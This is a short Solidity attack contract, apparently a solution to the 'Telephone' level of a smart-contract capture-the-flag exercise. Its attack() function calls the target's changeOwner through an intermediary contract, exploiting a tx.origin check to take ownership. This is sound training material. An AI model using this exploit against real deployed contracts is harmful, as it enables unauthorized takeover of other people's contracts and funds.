// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
        function changeOwner(address _owner) external;
}

contract TelephoneAttack {
        ITelephone public telephone;

        constructor(address _instnace) {
                telephone = ITelephone(_instnace);
        }
        function attack() external {
                telephone.changeOwner(msg.sender);
        }
}